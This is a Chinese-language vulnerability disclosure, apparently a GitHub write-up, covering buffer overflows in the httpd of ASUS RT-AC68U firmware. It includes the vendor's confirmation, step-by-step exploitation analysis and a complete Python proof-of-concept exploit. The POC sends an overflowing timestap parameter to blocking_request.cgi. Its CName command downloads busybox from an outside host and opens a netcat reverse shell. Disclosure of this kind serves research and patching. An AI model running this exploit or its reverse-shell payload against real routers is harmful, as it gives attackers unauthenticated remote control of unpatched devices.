# 前言
我在AC68U RT-AC68U_3.0.0.4_384_45713-g0f2983e.trx固件版本中发现了2个漏洞。
- 漏洞①：blocking_request.cgi  高危:未授权任意命令执行

  在httpd二进制文件中，攻击者可在未登陆验证的情况下发送特定的数据包成功利用此问题，可通过控制timestap参数进行缓冲区溢出达到任意命令执行效果

- 漏洞②：blocking.cgi  低危:授权拒绝服务
 原理同漏洞①但是经测试，无法达到任意命令执行效果，但是攻击后会将设备打崩且无法通过reset重启，需要通过救援模式刷固件
 
  在httpd二进制文件中，攻击者可在登陆验证的情况下发送特定的数据包成功利用此问题，可通过控制CName | Interval | timestap任一参数进行缓冲区溢出达到拒绝服务效果
  
华硕已经确认了该漏洞，不过该漏洞已经进行了修复，回复如下图：

 ![image](https://user-images.githubusercontent.com/45091804/146885064-f758bf4c-0b2e-4c40-a57d-7ec03febc742.png)


# 漏洞类型
缓冲区溢出

# 漏洞描述
在web服务对应二进制文件httpd中，攻击者可在未登陆验证的情况下，通过控制timestap参数进行缓冲区溢出触发漏洞达到远程任意命令执行的效果

# 影响范围
AC68U FirmwareVersion < 3.0.0.4.385.20633 
</br>
RT-AC5300 FirmwareVersion <3.0.0.4.384.82072
</br>
. . . . . .
</br>
此漏洞影响多个路由器型号，具体型号暂未统计，官方2020年8-9月份修复的RCE漏洞（如下图）似乎就是这个
</br>
![image](https://user-images.githubusercontent.com/45091804/146535975-97051c7f-a65e-465a-8ed6-bc15ae5f6e6c.png)

# 漏洞触发流程
**本次数据基于固件版本AC68U 3.0.0.4.384.45713**
</br>
CName、mac、interval、timestap参数内容均为可控
</br>
### 流程1. 构造timestap、mac参数满足条件通过判断条件
 ①系统时间+3600-atol(timestap参数)<20 （timestap参数:通过一次空包返回内容来计算时间戳（注意需要根据设备系统设置时区计算）
 ![image](https://user-images.githubusercontent.com/45091804/146538461-c4dcb76e-d911-42c3-8c2d-ba7e1309f06f.png)
 </br>
 ②sub_11840函数为nvram_get，初始MULTIFILTER_MAC值为空，str("",mac)，所以mac必须为空
  </br>
  
 ![image](https://user-images.githubusercontent.com/45091804/146538587-02d5ce10-1572-4c4b-b148-9dbfcf84840d.png)

### 流程2. 绕过atol函构造timestap参数
atol(1639469133aaaaaaa.....)返回内容为1639469133,所以只需要在计算好的时间戳后面填充即可，通过strcat函数触发漏洞
![image](https://user-images.githubusercontent.com/45091804/146538789-fe6e5a14-2b47-4c13-8bf5-a202dbe2f7ed.png)

# 漏洞利用
1. timestap参数第一次尝试填充4740 * a,查看栈中数据，还有40个字节需要填充，也就是时间戳 + 4880* a + p32(addr)
![image](https://user-images.githubusercontent.com/45091804/146540066-b3f23900-0969-4edd-9deb-8dc8632abae9.png)

2. 调试中发现会提前崩溃，逐步跟踪，发现崩溃点位于json_object_put函数，此函数参数会从栈上取数据（原数据值为0），而栈被覆盖了后取的数据导致提前崩溃
![image](https://user-images.githubusercontent.com/45091804/146541130-4c897ae3-6172-48d9-a902-0534d2f83480.png)

3. libjson-c.so.2.0.2查看json_object_put函数原型，a1就是栈上取的参数，也就是只有当满足条件a1=0 或 *(a1+12)-- != 1 才能保持正常返回。由于是strcat函数导致溢出，栈中数据出现00会截断。注意下图左边汇编代码，LDR是取内容，--后比较完后会通过STR指令将内容写回原地址，所以在覆盖返回地址前，理论上构造参数：时间戳 + 4840* a +p32(addr) +32*a +p32(addrToSystem) addr必须满足条件：可读、可写、无00
![image](https://user-images.githubusercontent.com/45091804/146541761-919669df-f73b-4917-8484-256c3f8ca10c.png)
4. 寻找合适地址
- 查看区段信息，未发现所需地址
- 查看lib库，开启了PIE，无法利用 （碰撞libc地址，因为概率太低不进行尝试了）
![image](https://user-images.githubusercontent.com/45091804/146541939-f0c53a5c-232e-4d2a-ae04-8dfb25d81d58.png)
5. 然而json_object_put函数内部有个函数指针调用，而a1的值是可控的，也就是不用覆盖到返回地址也可以劫持PC
![image](https://user-images.githubusercontent.com/45091804/146554377-df982dfb-d21a-4a3b-a0a6-f9ac650e5244.png)

6. 观察bss段数据 发现CName、mac、interval、timestap内容都存在bss段，且bss段可读可写。
构造结构如下图，且运行到json_object_put函数内，准备跳转前，发现R10的内容保存的是CName参数内容。
<sup> 


  
  
     #cmd：需要执行的命令
     #timeStapStr：计算好的时间戳
     #addr：interval参数内容首地址，需要根据cmd命令的长度进行调整
    'CName': cmd，
    'mac': '',
    'interval': 'a'*12+p32(1)+'a'*16+p32(0x0000EFA8),
    'timestap': timeStapStr +'a'*4740+p32(addr) 



</sup>

![image](https://user-images.githubusercontent.com/45091804/146554630-170a7eb3-5f7b-437b-8e44-6ad19c19f2cb.png)

# 漏洞演示
  [![Watch the video](https://raw.github.com/GabLeRoux/WebMole/master/ressources/WebMole_Youtube_Video.png)](https://youtu.be/9rpNKSVQtFM)
  
# POC 
POC需要根据不同版本调整
</br>
以下是争对3.0.0.4.384.45713固件版本的POC
<sup> 


  
    
    #coding=utf-8
    from pwn import *
    import re
    import time
    import requests
    import urlparse
    import urllib3
    urllib3.disable_warnings()
    import sys

    def rematch(strTmp):
        tm_year = strTmp[0][2]
        tm_month = strTmp[0][1]
        tm_day = strTmp[0][0]
        tm_hour = strTmp[0][3]
        tm_min = strTmp[0][4]
        tm_sec = strTmp[0][5]
        if tm_month == 'Jan':
            tm_month = '01'
        if tm_month == 'Feb':
            tm_month = '02'
        if tm_month == 'Mar':
            tm_month = '03'
        if tm_month == 'Apr ':
            tm_month = '04'
        if tm_month == 'May':
            tm_month = '05'
        if tm_month == 'Jun':
            tm_month = '06'
        if tm_month == 'Jul':
            tm_month = '07'
        if tm_month == 'Aug':
            tm_month = '08'
        if tm_month == 'Sept':
            tm_month = '09'
        if tm_month == 'Oct':
            tm_month = '10'
        if tm_month == 'Nov':
            tm_month = '11'
        if tm_month == 'Dec':
            tm_month = '12'
        tm_hour = int(tm_hour) + 8  # +8对应时区
        time_tmp = '{}-{}-{} {}:{}:{}'.format(tm_year, tm_month, tm_day, tm_hour, tm_min, tm_sec)
        print(time_tmp)
        ts = time.strptime(time_tmp, "%Y-%m-%d %H:%M:%S")
        timeStamp= int(time.mktime(ts))
        return timeStamp


    def getTime(url):
        scheme =  urlparse.urlparse(url).scheme
        hostname = urlparse.urlparse(url).hostname
        header={
            'Host': hostname,
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Origin': scheme+'://'+hostname,
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer': scheme+'://'+hostname,
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection':'close'
        }
        data1 ={
            'CName': '',
            'mac': '',
            'interval': '',
            'timestap': '',
        }
        url = url+'/blocking_request.cgi'
        ret = requests.post(url = url ,
                      headers = header,
                      data = data1,
                      verify=False)
        format_time =''
        for key, value in (ret.headers).items():
            if 'Date' in key:
                format_time = value
        tmp = re.findall(r', (.*?) (.*?) (.*?) (.*?):(.*?):(.*?) GMT',format_time)
        timeStap = rematch(tmp) + 3600
        timeStapStr = str(timeStap)
        print(timeStapStr)
        data2 ={
            'CName': 'cd /tmp/home/root;wget http://192.168.2.177:8080/busybox-armv6l;chmod 777 *;./busybox-armv6l nc 192.168.2.177:1234 -e /bin/ash',
            'mac': '',
            'interval': 'a'*12+p32(1)+'a'*16+p32(0x0000EFA8),   
            'timestap': timeStapStr +'a'*4740+p32(0x0006FE35),   #p32(addr) 此addr为interval参数内容首地址

        }
        ret = requests.post(url = url ,
                      headers = header,
                      data = data2,
                      verify=False,)
        print('End')


    if __name__ == '__main__':
        url = sys.argv[1]
        getTime(url)



</sup>
